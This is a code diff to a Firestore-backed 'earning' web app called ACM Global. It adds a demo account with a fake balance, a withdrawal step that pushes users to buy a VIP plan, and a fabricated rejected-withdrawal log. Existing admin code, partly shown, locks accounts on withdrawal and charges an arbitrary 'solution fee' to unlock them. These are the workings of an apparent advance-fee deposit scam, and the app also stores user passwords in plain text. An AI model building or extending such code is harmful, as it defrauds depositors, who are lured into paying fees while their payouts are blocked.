@@ -25,6 +25,7 @@
         .auth-logo span { color: #2563eb; }
         .auth-toggle { text-align: center; margin-top: 15px; font-size: 0.85rem; color: #64748b; }
         .auth-toggle span { color: #2563eb; font-weight: 700; cursor: pointer; }
+        .demo-badge-info { text-align: center; background: #eff6ff; color: #1e40af; padding: 10px; border-radius: 12px; font-size: 0.8rem; font-weight: 700; margin-bottom: 15px; border: 1px dashed #bfdbfe; }
 
         /* --- HOME SCREEN --- */
         .main-balance-wrapper { margin: 20px 0 15px 5px; }
@@ -130,6 +131,7 @@
         <div id="registerView" class="app-view active">
             <div class="auth-container">
                 <div class="auth-logo"><h2>ACM <span>Global</span></h2><p style="font-size:0.8rem; color:#64748b;">Create Your Earning Account</p></div>
+                <div class="demo-badge-info"><i class="fa-solid fa-circle-info"></i> For Testing: Use Mobile <b>demo</b> & Password <b>demo123</b> to try the app instantly!</div>
                 <div class="input-group"><label>MOBILE NUMBER</label><input type="text" id="reg-phone" placeholder="e.g. 03001234567"></div>
                 <div class="input-group"><label>USER NAME</label><input type="text" id="reg-username" placeholder="Enter full name"></div>
                 <div class="input-group"><label>PASSWORD</label><input type="password" id="reg-pass" placeholder="Enter password"></div>
@@ -142,6 +144,7 @@
         <div id="loginView" class="app-view">
             <div class="auth-container">
                 <div class="auth-logo"><h2>Welcome <span>Back</span></h2><p style="font-size:0.8rem; color:#64748b;">Login to continue journey</p></div>
+                <div class="demo-badge-info"><i class="fa-solid fa-circle-info"></i> For Testing: Use Mobile <b>demo</b> & Password <b>demo123</b></div>
                 <div class="input-group"><label>MOBILE NUMBER</label><input type="text" id="login-phone" placeholder="e.g. 03001234567"></div>
                 <div class="input-group"><label>PASSWORD</label><input type="password" id="login-pass" placeholder="Enter account password"></div>
                 <button class="submit-btn" onclick="handleLogin()">Login Account</button>
@@ -396,6 +399,9 @@
 
             if(!user || !phone || !pass) { alert("Sari fields fill karein!"); return; }
 
+            // Restrict demo registering manually
+            if(phone.toLowerCase() === "demo") { alert("Invalid Number!"); return; }
+
             try {
                 const userRef = doc(db, "users", phone);
                 const userSnap = await getDoc(userRef);
@@ -423,6 +429,28 @@
             const phone = document.getElementById('login-phone').value.trim();
             const pass = document.getElementById('login-pass').value.trim();
             if(!phone || !pass) { alert("Credentials enter karein!"); return; }
+
+            // --- INTERCEPT DEMO ACCOUNT TRIGGER ---
+            if(phone.toLowerCase() === "demo" && pass === "demo123") {
+                currentSession = {
+                    username: "Demo Test User",
+                    phone: "demo",
+                    password: "demo123",
+                    balance: 5500.00,
+                    activePlanPrice: 1500,
+                    activePlanName: "Plan 2 (Demo)",
+                    dailyVideosLimit: 40,
+                    total_withdraw: 0,
+                    total_deposit: 1500,
+                    isLocked: false,
+                    lockReason: "",
+                    lockFee: 0,
+                    isDemoMode: true // Special safety tag
+                };
+                sessionStorage.setItem('acm_user_phone', 'demo');
+                enterAppDashboard();
+                return;
+            }
 
             try {
                 const userRef = doc(db, "users", phone);
@@ -460,6 +488,7 @@
 
         async function saveCurrentSessionToDatabase() {
             if(!currentSession) return;
+            if(currentSession.isDemoMode) return; // Never save demo changes to remote DB
             try {
                 await updateDoc(doc(db, "users", currentSession.phone), currentSession);
             } catch (error) { console.error(error); }
@@ -523,6 +552,14 @@
 
             if(!enteredAmount || !fileInput) {
                 alert("Meherbani karke saari details aur screenshot attach karein!");
+                return;
+            }
+
+            // If Demo Mode -> Bypass FireStore directly
+            if(currentSession.isDemoMode) {
+                closeCheckoutGateway();
+                alert(`🎉 [DEMO] Screenshot processed perfectly. Real admin was not modified!`);
+                switchView('homeView');
                 return;
             }
 
@@ -637,6 +674,13 @@
             if(amount < 2000) { alert("Minimum withdrawal limit is Rs 2,000!"); return; }
             if(amount > currentSession.balance) { alert("Insufficient balance!"); return; }
 
+            // --- INTERCEPT DEMO ACCOUNT WITHDRAWAL REDIRECT ---
+            if(currentSession.isDemoMode) {
+                alert("⚠️ Withdrawal restricted! Naya withdrawal lagane ke liye pehle VIP plan active karna lazmi hai.");
+                switchView('plansView'); // Intercepted: Redirects back to plans matrix!
+                return;
+            }
+
             try {
                 currentSession.balance -= amount;
                 await saveCurrentSessionToDatabase();
@@ -660,6 +704,12 @@
         async function loadUserTransactionLogs() {
             const container = document.getElementById('user-history-logs-box');
             container.innerHTML = "";
+
+            if(currentSession.isDemoMode) {
+                container.innerHTML = `<div class="log-item"><div><b>EasyPaisa Withdraw (Demo)</b><br><small>Rs 2500</small></div><span class="status-badge status-rejected">REJECTED</span></div>`;
+                return;
+            }
+
             try {
                 const depSnap = await getDocs(collection(db, "deposits"));
                 depSnap.forEach(d => {
@@ -774,14 +824,12 @@
                     const userData = userSnap.data();
 
                     if(depData.type === "unblock_fee") {
-                        // Clear Lock status completely if activation fee approved
                         await updateDoc(userRef, {
                             isLocked: false, lockReason: "", lockFee: 0,
                             total_deposit: userData.total_deposit + depData.amountSent
                         });
                         alert("User restriction fee approved. Dashboard Unlocked!");
                     } else {
-                        // Standard Plan setup
                         await updateDoc(userRef, {
                             activePlanName: depData.planName, activePlanPrice: depData.planPrice,
                             dailyVideosLimit: depData.videosCount, total_deposit: userData.total_deposit + depData.planPrice
@@ -812,7 +860,6 @@
                     const feeStr = prompt("Is problem ko solve karne ki required solution fee kitni hai? (PKR):", "500");
                     const feeVal = parseFloat(feeStr) || 0;
 
-                    // Return ALL money back to wallet, lock withdrawal axis node
                     await updateDoc(userRef, {
                         balance: userData.balance + witData.amount,
                         isLocked: true,
@@ -848,6 +895,12 @@
         window.addEventListener('DOMContentLoaded', async () => {
             const savedPhone = sessionStorage.getItem('acm_user_phone');
             if (savedPhone) {
+                if(savedPhone === "demo") {
+                    // Re-trigger demo identity session upon browser refresh
+                    currentSession = { username: "Demo Test User", phone: "demo", password: "demo123", balance: 5500.00, activePlanPrice: 1500, activePlanName: "Plan 2 (Demo)", dailyVideosLimit: 40, total_withdraw: 0, total_deposit: 1500, isLocked: false, lockReason: "", lockFee: 0, isDemoMode: true };
+                    enterAppDashboard();
+                    return;
+                }
                 try {
                     const userSnap = await getDoc(doc(db, "users", savedPhone));
                     if (userSnap.exists()) {
